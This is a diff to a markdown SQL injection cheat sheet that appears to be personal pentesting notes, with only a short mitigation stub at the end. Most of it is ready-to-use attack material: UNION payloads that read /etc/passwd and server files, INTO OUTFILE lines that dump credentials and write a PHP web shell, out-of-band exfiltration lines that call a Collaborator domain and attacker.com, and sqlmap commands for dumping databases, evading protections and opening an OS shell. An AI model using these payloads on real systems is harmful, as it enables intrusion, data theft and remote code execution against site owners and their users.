@@ -34,7 +34,7 @@
 ### Retrieving Data from other Database Tables&#x20;
 
 * Use `UNION` keyword&#x20;
-* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query&#x20;
+* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query
 
 #### Requirements&#x20;
 
@@ -67,9 +67,25 @@
 ### Reading Files <a href="#reading-files" id="reading-files"></a>
 
 * We can start looking for what privileges we have with that user.
-* We see that the `FILE` privilege is listed for our user, enabling us to read files. <sup><sub>(eg for MySQL)<sub></sup>
+  * `SELECT super_priv FROM mysql.user`
+  * `SELECT grantee, privilege_type FROM information_schema.user_privileges`
+* If  `FILE` privilege is listed for our user, enables us to read files. <sup><sub>(eg for MySQL)<sub></sup>
 * `SELECT LOAD_FILE('/etc/passwd');`  <sup><sub>(Might need to provide full path)<sub></sup>
-* Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
+* Example Payload: `' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` , `' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`&#x20;
+
+### Writing Files <a href="#writing-files" id="writing-files"></a>
+
+* To be able to write files to the back-end server using a MySQL database, we require three things:
+  1. User with `FILE` privilege enabled
+     1. `SELECT super_priv FROM mysql.user`
+     2. `SELECT grantee, privilege_type FROM information_schema.user_privileges`
+  2. MySQL global `secure_file_priv` variable not enabled
+     1. `SHOW VARIABLES LIKE 'secure_file_priv';`  <sup><sub>(The<sub></sup> [<sup><sub>secure\_file\_priv<sub></sup>](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) <sup><sub>variable is used to determine where to read/write files from.)<sub></sup>
+     2. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
+  3. Write access to the location we want to write to on the back-end server
+* `SELECT * from users INTO OUTFILE '/tmp/credentials';`
+* `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`&#x20;
+* `select '<?php system($_REQUEST[0]); ?>' into outfile '/var/www/html/shell.php'-- -`
 
 ### Blind SQL Injection Detection&#x20;
 
@@ -114,12 +130,61 @@
 * `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`&#x20;
 * `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
 * `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>+%25remote%3b]>'),'/l')+FROM+dual--`&#x20;
+* `LOAD_FILE(CONCAT('\\',@@version,'.attacker.com\README.txt'))`
 
 ### Bypass WAF using Hackvertor&#x20;
 
 * Encode -> dec\_entities/hex\_entities
 
-### Mitigation
+## SQLMAP Techniques
+
+* The technique characters `BEUSTQ` refers to the following:
+  * `B`: Boolean-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=1`<sub></sup><sup><sub>)<sub></sup>
+  * `E`: Error-based <sup><sub>(<sub></sup><sup><sub>`AND GTID_SUBSET(@@version,0)`<sub></sup><sup><sub>)<sub></sup>
+  * `U`: Union query-based <sup><sub>(<sub></sup><sup><sub>`UNION ALL SELECT 1,@@version,3`<sub></sup><sup><sub>)<sub></sup>
+  * `S`: Stacked queries <sup><sub>(<sub></sup><sup><sub>`; DROP TABLE users`<sub></sup><sup><sub>)<sub></sup>
+  * `T`: Time-based blind <sup><sub>(<sub></sup><sup><sub>`AND 1=IF(2>1,SLEEP(5),0)`<sub></sup><sup><sub>)<sub></sup>
+  * `Q`: Inline queries <sup><sub>(<sub></sup><sup><sub>`SELECT (SELECT @@version) from`<sub></sup><sup><sub>)<sub></sup>
+
+## SQL Comands
+
+### Basic
+
+* `sqlmap -r req.txt --batch --dump`
+* `sqlmap -r req.txt --batch --dump --level 5 --risk 3`&#x20;
+* `sqlmap -r req.txt --banner --current-user --current-db --is-dba`
+* `sqlmap -r req.txt --tables -D <DB-Name>`
+* `sqlmap -r req.txt -D <DB-Name> -T <Table-Name> --batch --dump`
+* `sqlmap -r req.txt --batch --dump --level 5 --risk 3 --random-agent --tamper=between --technique=t`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>
+
+### Prefix/Suffix
+
+* `sqlmap -r req.txt --prefix="%'))" --suffix="-- -" --batch --dump`&#x20;
+
+### UNION Columns
+
+* `sqlmap -r req.txt --technique=U --union-cols=5 --dump`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>
+
+### Search Database, Column, Table Names
+
+* `sqlmap -r req.txt --search -C style --batch`&#x20;
+
+### Bypass Protections
+
+* `sqlmap -r req.txt --csrf-token=<token-parameter-name> --batch --dump`
+* `sqlmap -r req.txt --randomize=<random-parameter-name> --batch --dump`
+* `sqlmap -r req.txt --random-agent --batch --dump`&#x20;
+* `sqlmap -r req.txt --tamper=between --batch --dump`
+
+### Read Files
+
+* `sqlmap -r req.txt --file-read "/var/www/html/flag.txt" --batch`&#x20;
+
+### OS Exploitation
+
+* `sqlmap -r req.txt --os-shell --technique=E --batch`  <sup><sub>(we can specify these techniques with<sub></sup> <sup><sub> </sup><sup><sub>`--technique=BEUST`<sub></sup><sup><sub>)<sub></sup>
+
+## Mitigation
 
 * Input Sanitization
 * Input Validation
